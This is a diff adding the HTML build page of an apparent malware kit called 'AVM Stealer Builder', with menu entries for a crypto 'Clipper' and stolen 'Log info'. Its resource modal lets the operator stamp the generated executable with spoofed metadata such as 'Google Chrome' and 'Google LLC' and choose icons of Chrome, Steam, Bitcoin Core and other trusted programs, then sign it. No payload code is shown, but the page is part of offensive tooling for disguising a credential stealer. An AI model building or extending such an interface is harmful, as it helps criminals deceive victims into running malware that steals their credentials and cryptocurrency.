@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="UTF-8" />
+    <link rel="stylesheet" href="style/style_build.css">
+    <link rel="stylesheet" href="style/style_notification.css">
+    <link rel="stylesheet" href="style/style_transitions.css">
+    <link rel="stylesheet" href="style/style_modal.css">
+    <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
+    <title>AVM Stealer Builder</title>
+</head>
+
+<body>
+    <!-- Sidebar -->
+    <nav class="sidebar">
+        <div class="logo-menu">
+            <h2 class="logo">AVM Stealer</h2>
+            <i class="bx bx-menu toggle-btn"></i>
+        </div>
+        <ul class="list">
+            <li class="list-item">
+                <a href="index.html">
+                    <i class='bx bx-grid-alt'></i>
+                    <span class="link_name" style="--i:1">Features</span>
+                </a>
+            </li>
+            <li class="list-item">
+                <a href="binder.html">
+                    <i class='bx bx-wallet'></i>
+                    <span class="link_name" style="--i:2">Clipper</span>
+                </a>
+            </li>
+            <li class="list-item">
+                <a href="info.html">
+                    <i class='bx bx-detail bx-flip-horizontal'></i>
+                    <span class="link_name" style="--i:3">Log info</span>
+                </a>
+            </li>
+            <li class="list-item active">
+                <a href="build.html">
+                    <i class="bx bx-check-shield bx-flashing"></i>
+                    <span class="link_name" style="--i:4">Build</span>
+                </a>
+            </li>
+            <li class="list-item">
+                <a href="about.html">
+                    <i class='bx bx-info-circle'></i>
+                    <span class="link_name" style="--i:5">About</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+
+    <div class="container">
+        <div class="maintitle">
+            <h1><i class="bx bx-check-shield"></i> AVM Builder</h1>
+            <div class="header-buttons">
+                <button id="helpButton" class="help-button" style="display: none;">
+                    <i class='bx bx-edit'></i> Ressources
+                </button>
+                <button id="newButton" class="new-button" style="display: none;">
+                    <i class='bx bx-file-blank'></i> Default App
+                </button>
+            </div>
+        </div>
+
+        <div class="outputContainer">
+            <div class="outputBox" id="outputBox">
+                <div class="log-message">[<span style="color: rgb(155, 155, 155)"> + </span>] AVM - Builder - Version
+                    [1.3]</div>
+                <div class="log-message">[<span style="color: rgb(155, 155, 155)"> + </span>] Press "Build" button to
+                    continue...
+                </div>
+            </div>
+        </div>
+        <label class="selectButton" for="fileInput">Build&nbsp;<i class='bx bx-check-circle'> </i></label>
+    </div>
+
+    </div>
+
+    <!-- Resource Editor Modal -->
+    <div id="resourceModal" class="modal">
+        <div class="modal-content glass-effect">
+            <div class="modal-header">
+                <h2><i class='bx bx-edit'></i> EXE Resources Settings</h2>
+                <span class="close-modal"><i class='bx bx-x'></i></span>
+            </div>
+
+            <div class="modal-body">
+                <!-- Left Column: Metadata -->
+                <div class="metadata-section">
+                    <div class="input-group">
+                        <label>Product Name</label>
+                        <input type="text" id="inputProductName" placeholder="e.g. Google Chrome">
+                    </div>
+                    <div class="input-group">
+                        <label>Company Name</label>
+                        <input type="text" id="inputCompanyName" placeholder="e.g. Google LLC">
+                    </div>
+                    <div class="input-group">
+                        <label>File Description</label>
+                        <input type="text" id="inputDescription" placeholder="e.g. Chrome Setup">
+                    </div>
+                    <div class="input-group">
+                        <label>File Version</label>
+                        <input type="text" id="inputFileVersion" placeholder="1.0.0.0">
+                    </div>
+                    <div class="input-group">
+                        <label>Product Version</label>
+                        <input type="text" id="inputProductVersion" placeholder="1.0.0.0">
+                    </div>
+                    <div class="input-group">
+                        <label>Copyright</label>
+                        <input type="text" id="inputCopyright" placeholder="© 2024 All rights reserved">
+                    </div>
+                </div>
+
+                <!-- Right Column: Icons -->
+                <div class="icon-column">
+                    <!-- Preview Area -->
+                    <div class="preview-box">
+                        <div class="current-icon-wrapper">
+                            <img id="iconPreview" src="" class="current-icon" style="display:none;">
+                            <i class='bx bx-image placeholder-icon' style="font-size: 40px; color: #555;"></i>
+                        </div>
+                        <p id="selectedIconName" class="file-name-display">No icon selected</p>
+
+                        <div class="icon-actions">
+                            <button id="btnChooseIcon" class="icon-btn">
+                                <i class='bx bx-folder-open'></i> Browse...
+                            </button>
+                            <button id="btnRandomIcon" class="icon-btn">
+                                <i class='bx bx-shuffle'></i> Random
+                            </button>
+                        </div>
+                        <input type="file" id="iconFileInput" accept=".ico" style="display: none;">
+                    </div>
+
+                    <!-- Predefined Grid -->
+                    <div class="predefined-section">
+                        <h3>Predefined Icons</h3>
+                        <div class="icon-grid">
+                            <div class="grid-item" data-filename="chrome.ico" title="Chrome">
+                                <img src="../../icon/chrome.ico" alt="chrome">
+                            </div>
+                            <div class="grid-item" data-filename="setup.ico" title="Setup">
+                                <img src="../../icon/setup.ico" alt="setup">
+                            </div>
+                            <div class="grid-item" data-filename="epic games.ico" title="Epic Games">
+                                <img src="../../icon/epic games.ico" alt="epic games">
+                            </div>
+                            <div class="grid-item" data-filename="steam.ico" title="Steam">
+                                <img src="../../icon/steam.ico" alt="steam">
+                            </div>
+                            <div class="grid-item" data-filename="obs.ico" title="OBS Studio">
+                                <img src="../../icon/obs.ico" alt="obs">
+                            </div>
+                            <div class="grid-item" data-filename="bitcoin.ico" title="Bitcoin Core">
+                                <img src="../../icon/bitcoin.ico" alt="bitcoin">
+                            </div>
+                            <div class="grid-item" data-filename="systeminformer.ico" title="System Informer">
+                                <img src="../../icon/systeminformer.ico" alt="system informer">
+                            </div>
+                            <div class="grid-item" data-filename="HWiNFO.ico" title="HWiNFO64">
+                                <img src="../../icon/HWiNFO.ico" alt="HWiNFO">
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Action Button moved here for alignment -->
+                    <div class="action-container">
+                        <button id="btnApplyResources" class="btn-apply">
+                            <i class='bx bx-check-shield'></i> Apply & Sign
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="scripts/script_notification.js"></script>
+    <script src="scripts/script_transitions.js"></script>
+    <script src="scripts/script_build.js"></script>
+    <script src="scripts/script_resource_popup.js"></script>
+</body>
+
+</html>
